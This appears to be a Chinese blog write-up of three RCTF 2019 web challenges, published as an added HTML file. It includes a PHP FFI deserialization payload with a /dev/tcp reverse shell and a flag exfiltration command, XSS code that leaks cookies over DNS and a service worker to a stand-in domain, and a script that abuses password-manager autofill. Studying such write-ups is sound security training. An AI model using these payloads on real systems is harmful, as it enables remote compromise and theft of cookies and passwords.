@@ -1,0 +1,1029 @@
+<!DOCTYPE html>
+<html lang="">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="hurricane618">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="hurricane618">
+    
+    <meta name="keywords" content="hexo,web security,ctf,hurricane618,代码审计,iot">
+    
+    <meta name="description" content="hurricane618's blog">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>2019RCTF 部分Web的WriteUp · 风之栖息地|hurricane618&#39;s blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="/assets/hurricane_favicon.ico">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+    <script>
+        (function (i, s, o, g, r, a, m) {
+        i['GoogleAnalyticsObject'] = r; i[r] = i[r] || function () {
+        (i[r].q = i[r].q || []).push(arguments)
+        }, i[r].l = 1 * new Date(); a = s.createElement(o),
+        m = s.getElementsByTagName(o)[0]; a.async = 1; a.src = g; m.parentNode.insertBefore(a, m)
+        })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');
+        ga('create', 'UA-121933059-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/">风之栖息地</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">2019RCTF 部分Web的WriteUp</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href="/">风之栖息地</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg1.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            2019RCTF 部分Web的WriteUp
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class="post-intro-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="CTF">CTF</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">1.9k</span>阅读时长: <span class="post-count reading-time">8 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/05/24</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <p>一年一度的RCTF开始了，又能学一波骚操作，RCTF的web题目去年就非常好，今年也特别出色。由于研究所月赛的原因没有参与其中，所以赛后来复现一下。</p>
+<h2 id="nextphp"><a href="#nextphp" class="headerlink" title="nextphp"></a>nextphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>])) &#123; </span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($_GET[<span class="string">'a'</span>]); </span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line"></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>一个代码执行，但是肯定没有这么简单，执行phpinfo查看到<code>disable_function</code>之后，发现禁用了已知范围内的所有危险函数，并且还把之前考差过的<code>putenv</code>也禁用了。这样就没有办法使用<code>LD_PRELOAD</code>来劫持执行命令了。 </p>
+<p>同时也检查了一下其他方面，有没有使用什么危险的后端组件，也是全部GG。没有php-fpm，没有mog_cgi，没有ImageMagick等等。 </p>
+<p>一筹莫展之际，林师傅提醒到可以扫描文件看看，所以果断看看路径上有些啥。通过phpinfo可以得到web路径，使用php函数来打开路径读取内容即可。 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=var_dump(glob(&quot;/var/www/html/*&quot;));</span><br><span class="line">array(2) &#123; [0]=&gt; string(23) &quot;/var/www/html/index.php&quot; [1]=&gt; string(25) &quot;/var/www/html/preload.php&quot; &#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到里面除了<code>index.php</code>以外，还有一个神奇的<code>preload.php</code>，读取其中的内容看看。 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=var_dump(file_get_contents(&quot;/var/www/html/preload.php&quot;));</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $data = [</span><br><span class="line">        <span class="string">'ret'</span> =&gt; <span class="keyword">null</span>,</span><br><span class="line">        <span class="string">'func'</span> =&gt; <span class="string">'print_r'</span>,</span><br><span class="line">        <span class="string">'arg'</span> =&gt; <span class="string">'1'</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">'ret'</span>] = <span class="keyword">$this</span>-&gt;data[<span class="string">'func'</span>](<span class="keyword">$this</span>-&gt;data[<span class="string">'arg'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__serialize</span><span class="params">()</span>: <span class="title">array</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span><span class="params">(array $data)</span> </span>&#123;</span><br><span class="line">        array_merge(<span class="keyword">$this</span>-&gt;data, $data);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> <span class="params">()</span>: <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span><span class="params">($payload)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = unserialize($payload);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span> <span class="params">($key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$key];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span> <span class="params">($key, $value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="keyword">Exception</span>(<span class="string">'No implemented'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="keyword">Exception</span>(<span class="string">'No implemented'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>里面是一个继承序列化类的自定义类，同时在phpinfo中看到它被<code>opcache.preload</code>预加载了。 </p>
+<p>感觉这里是有突破口的，搜了一圈发现只有php文档有资料，当时没有什么空就放弃了。 </p>
+<p>看了zsx大佬的<a href="https://github.com/zsxsoft/my-ctf-challenges/tree/master/rctf2019/nextphp" target="_blank" rel="noopener">writeup</a>之后，发现这个php是7.4的开发版本，开发版经常会有新特性，这里就是利用一个新特性<code>FFI-Foreign Function Interface</code>，中文叫外部函数接口。 </p>
+<p>利用这个我们可以引用被禁用的函数，但是由于<code>__set</code>被设置成报错，所以没有办法对<code>$data</code>赋值。所以这里需要调用<code>__unserialize</code>，这里又有一个新机制，在这个类即继承了反序列化类，又拥有<code>__serialize()/__unserialize()</code>，就会优先执行这种方法。 </p>
+<p>所以我们只需要构造一个类，先正常序列化，修改成<code>class A</code>，然后再反序列化，这样就会覆盖原始的值，同时并不是直接赋值，所以也不会触发<code>__set</code>。最后，利用ffi引入命令执行函数，执行命令反弹shell。 </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $data = [</span><br><span class="line">        <span class="string">'ret'</span> =&gt; <span class="keyword">null</span>,</span><br><span class="line">        <span class="string">'func'</span> =&gt; <span class="string">'FFI::cdef'</span>,</span><br><span class="line">        <span class="string">'arg'</span> =&gt; <span class="string">'int system(const char *command);'</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> <span class="params">()</span>: <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span><span class="params">($payload)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = unserialize($payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> D();</span><br><span class="line">$b = serialize($a);</span><br><span class="line">$b = str_replace(<span class="string">'"D"'</span>, <span class="string">'"A"'</span>, $b);</span><br><span class="line"><span class="keyword">echo</span> urlencode($b);</span><br><span class="line"><span class="comment">//$d = unserialize($b);</span></span><br><span class="line"><span class="comment">//$d-&gt;ret-&gt;system('bash -i &gt;&amp; /dev/tcp/xxxx/8080 0&gt;&amp;1');</span></span><br></pre></td></tr></table></figure>
+<p>这样就把反序列化数据带入最后两行，在远程服务端执行，就可以了。但是这中间有一个坑，就是没有办法反弹shell，只能一次一次的执行命令后回传到vps主机上。 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$d-&gt;ret-&gt;system(&apos;bash -c &quot;cat /flag &gt; /dev/tcp/xxxx/xxxx&quot;&apos;);</span><br></pre></td></tr></table></figure>
+<img src="/2019/05/24/2019rctf-some-writeup/1.jpg">
+<h2 id="jail"><a href="#jail" class="headerlink" title="jail"></a>jail</h2><p>漏洞点比较直接，在post区域中没有任何过滤，可以任意输入，是一个存储型xss，但是奈何有csp。 </p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">content-security-policy</span>: sandbox allow-scripts allow-same-origin; base-uri 'none';default-src 'self';script-src 'unsafe-inline' 'self';connect-src 'none';object-src 'none';frame-src 'none';font-src data: 'self';style-src 'unsafe-inline' 'self';</span><br></pre></td></tr></table></figure>
+<p>由于有沙盒，所以没有办法正常外连传输数据，同时由于有banner导致没有办法自动跳转，这里思路有这么几个。 </p>
+<ol>
+<li><p>一般这种连接是没有限制dns查询的，所以可以使用dns外带数据，这里的方法主要是<code>&lt;link rel=&quot;dns-prefetch&quot; href=xxxxx.xxxxx.xxxx&gt;</code>，这样在dns记录中就可以查到我们想要的数据。 </p>
+</li>
+<li><p>利用某些服务机制绕过csp的策略，zsx的writeup中介绍了两种，一个是WebRTC服务会忽略<code>connect-src</code>，<a href="https://github.com/w3c/webrtc-pc/issues/1727" target="_blank" rel="noopener">https://github.com/w3c/webrtc-pc/issues/1727</a>。另外一种是利用service worker，这个是js在浏览器注册的一种持续化的服务，这个服务会优先使用它自己的csp策略，所以直接传输空的csp策略就可以绕过。 </p>
+</li>
+</ol>
+<p>由于这道题目是直接开启了script的<code>unsafe-inline</code>，所以是可以直接上script标签的。这里是直接用最简单的dns外带数据的方法。 </p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">toHex</span>(<span class="params">s</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> val = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; s.length; i++) &#123;</span><br><span class="line">        val += s.charCodeAt(i).toString(<span class="number">16</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br><span class="line">c = <span class="built_in">document</span>.cookie.split(<span class="string">";"</span>);</span><br><span class="line">head = <span class="built_in">document</span>.getElementsByTagName(<span class="string">"HEAD"</span>)[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;c.length;i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> t = c[i];</span><br><span class="line">    <span class="keyword">if</span> (t.indexOf(<span class="string">"flag="</span>) &gt; <span class="number">-1</span>)&#123;</span><br><span class="line">        t = toHex(t.split(<span class="string">"="</span>)[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; <span class="number">5</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">var</span> tt =t.substr(j*<span class="number">20</span>,<span class="number">20</span>);</span><br><span class="line">            <span class="keyword">if</span> (tt.length == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">            head.innerHTML = head.innerHTML + <span class="string">"&lt;link rel=\"dns-prefetch\" href=\"//v_"</span>+j+<span class="string">"_"</span> + tt+  <span class="string">".flag.xxxxxx.ceye.io\"&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>将dns外带数据传给ceye，一个dns的log平台，收到数据之后hex解码即可得到flag。 </p>
+<img src="/2019/05/24/2019rctf-some-writeup/2.jpg">
+<p>当然预期解法是service worker，这里通过文件上传js，然后在post处引用。因为service worker机制的问题，可以绕过原来的csp设置。顺带一提，必须要是https才行。 </p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fetch(<span class="string">'https://YOUR_DOMAIN/?'</span> + <span class="built_in">encodeURIComponent</span>(globalThis.location.href), &#123;<span class="attr">mode</span>: <span class="string">'no-cors'</span>&#125;)</span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"> navigator.serviceWorker.register(<span class="string">'/uploads/21ca75a36c5cdacfd4653fadb2553242.js?'</span> + <span class="built_in">encodeURIComponent</span>(<span class="built_in">document</span>.cookie), &#123;<span class="attr">scope</span>: <span class="string">'/uploads/'</span>&#125;); </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="password"><a href="#password" class="headerlink" title="password"></a>password</h2><p>延续上一道题目的环境，只不过这次需要获取管理员的密码。是一道很有意思的题目，看完题解之后，发现它是利用密码管理软件的自动提示功能来获得密码。</p>
+<p>这里只能通过service worker来完成，首先看到提示之后去读取<code>document.body.innerHTML</code>，可以拿到一些有趣的数据，在里面可以看到有cip这个单词，查询之后知道是chromeipass。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"> setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;navigator.serviceWorker.register(<span class="string">'/uploads/511b3c8839bd36230c4aa3c5ff5545ef.js?'</span> + <span class="built_in">encodeURIComponent</span>(<span class="built_in">document</span>.body.innerHTML), &#123;<span class="attr">scope</span>:<span class="string">'/uploads/'</span>&#125;);&#125;, <span class="number">1000</span>) </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这时我们在post的地方增加两个input，一个是username，一个是password，控制脚本去点击这个username的input，然后再去读取<code>document.body.innerHTML</code>。发现会多出一些条目，在其中可以看到flag的选项。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"username"</span> <span class="attr">name</span>=<span class="string">"username"</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span>&gt;</span> <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>&#123; <span class="built_in">document</span>.querySelector(<span class="string">'[type=username]'</span>).click() &#125;,<span class="number">500</span>); setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;navigator.serviceWorker.register(<span class="string">'/uploads/511b3c8839bd36230c4aa3c5ff5545ef.js?'</span> + <span class="built_in">encodeURIComponent</span>(<span class="built_in">document</span>.body.innerHTML), &#123;<span class="attr">scope</span>:<span class="string">'/uploads/'</span>&#125;);&#125;, <span class="number">1000</span>) </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>很明显了，只要选择flag为用户名，再去读取密码就可以了。最后读取flag的password的脚本，配合上之前jail同样的service worker的js，就能收到flag了。</p>
